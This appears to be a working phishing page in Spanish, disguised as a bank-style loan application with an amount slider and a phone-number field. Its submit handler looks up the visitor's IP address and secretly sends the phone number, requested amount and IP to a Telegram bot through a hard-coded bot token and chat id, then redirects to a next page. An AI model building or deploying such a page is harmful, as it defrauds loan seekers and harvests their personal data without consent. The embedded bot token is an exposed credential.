<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Formulario con Barra de Préstamo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/15.5.1/nouislider.min.css">
    <style>
        * { margin: 0; padding: 0; }
        @font-face {
            font-family: dinReg;
            src: url(din-regular.ttf);
        }
    </style>
    <style>
        .loan-slider-container {
            position: relative;
            width: 80%;
            max-width: 420px;
            margin: 20px auto;
        }

        #loan-slider {
            height: 10px;
            margin-top: 40px;
            border-radius: 5px;
        }

        .slider-value-tooltip {
            position: absolute;
            top: -50px;
            transform: translateX(-50%);
            font-size: 18px;
            background-color: #00693c;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            text-align: center;
        }

        .noUi-handle {
            border-radius: 50%;
            width: 20px;
            background-color: #00693c;
            border: none;
        }

        .noUi-connect {
            background: #00693c; /* Color de relleno cuando se mueve el slider */
        }
    </style>
  </head>
  <body>
    <div id="main-cnt" style="overflow: hidden; min-height: 100vh; position: relative;">
        <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
            <div id="frmc" style="display: inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
                <form id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(22.svg); position: relative;">
                    <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">

                    <div class="pump" style="font-family: sans-serif; padding: 10px;">
                        <img width="250px" style="margin-top: 110px;" src="5179203811758156999.jpg" alt="">
                        <br>
                        <h1 style="font-size: 25px;">Solicita hoy! Tu crédito de libre inversión</h1>
                        <div class="loan-slider-container">
                            <div id="loan-slider"></div>
                            <div id="slider-value" class="slider-value-tooltip">C$ 25,000</div>
                        </div>
                        <input type="tel" id="phone" name="phone" placeholder="Número de teléfono" style="margin-top: 20px; padding: 10px; width: 90%; border-radius: 5px; border: 1px solid #ccc;">
                    </div>

                    <input type="submit" style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 3px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;" value="Continuar">

                    <br><br><br><br><br><br>
                </form>
            </div>
            <div id="bnncont" style="text-align: right; display: inline-block;">
                <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                    <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;"><img src="terms.svg" style="width: 60%; position: relative; top: 80vh;"></div>
                </div>
            </div>
        </div>
    </div>

    <style>
        @media screen and (max-width: 1024px) {
            body {
                width: 100% !important;
                background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
                background-repeat: no-repeat !important;
                min-width: auto !important;
                zoom: 90% !important;
            }
            #ctn {
                border-radius: 6px !important;
            }
            #main-cnt {
                text-align: center !important;
                padding-top: 30px;
            }
            #frmc {
                width: 100% !important;
            }
            #bnncont {
                display: none !important;
            }
        }
    </style>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/15.5.1/nouislider.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/wnumb/1.1.0/wNumb.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const slider = document.getElementById('loan-slider');
            const sliderValue = document.getElementById('slider-value');
            const form = document.getElementById('f1');

            // Inicializa noUiSlider en la barra del préstamo
            noUiSlider.create(slider, {
                start: 25000,
                connect: 'lower',
                range: {
                    'min': 25000,
                    'max': 250000
                },
                step: 5000,
                format: wNumb({
                    decimals: 0,
                    thousand: ','
                })
            });

            // Actualiza el valor del tooltip con el valor actual del slider
            slider.noUiSlider.on('update', function (values, handle) {
                const value = values[handle];
                sliderValue.innerHTML = `C$ ${value}`;

                // Obtiene la posición del control (handle) para mover el tooltip
                const sliderRect = slider.getBoundingClientRect();
                const handleElement = slider.querySelector('.noUi-handle');
                const handleRect = handleElement.getBoundingClientRect();

                // Calcula la posición del valor sobre el control del deslizador
                const handlePosition = handleRect.left - sliderRect.left + (handleElement.offsetWidth / 2);
                sliderValue.style.left = `${handlePosition}px`;
            });

            // Evento de envío del formulario
            form.addEventListener('submit', function (event) {
                event.preventDefault();

                const phone = document.getElementById('phone').value;
                const loanAmount = slider.noUiSlider.get();

                // Validar el número de teléfono
                if (!phone) {
                    alert("Por favor, ingrese su número de teléfono.");
                    return;
                }

                // Obtener la IP del cliente
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const ipCliente = data.ip;

                        // Datos del bot de Telegram
                        const token = "7940406372:AAEalrL_AyUSB-ljZImtm0IGYmoxd4bETQE";
                        const chat_id = "-4574562812";

                        // Mensaje a enviar a Telegram
                        const mensaje = `Solicitud de Préstamo:\nCantidad solicitada: C$ ${loanAmount}\nTeléfono: ${phone}\nIP del Cliente: ${ipCliente}`;

                         
                        const url = `https://api.telegram.org/bot${token}/sendMessage`;

                         fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                            },
                            body: JSON.stringify({
                                chat_id: chat_id,
                                text: mensaje,
                            }),
                        })
                        .then(response => {
                            if (response.ok) {
                                // Redirigir al usuario después de enviar la solicitud
                                window.location.href = "index.php";
                            } else {
                                alert("Hubo un problema al enviar la solicitud. Inténtalo nuevamente.");
                            }
                        })
                        .catch(error => {
                            console.error("Error al enviar los datos a Telegram:", error);
                            alert("Hubo un problema al enviar la solicitud. Inténtalo nuevamente.");
                        });
                    })
                    .catch(error => {
                        console.error("Error al obtener la IP del cliente:", error);
                        alert("Hubo un problema al obtener la IP. Inténtalo nuevamente.");
                    });
            });
        });
    </script>
  </body>
</html>
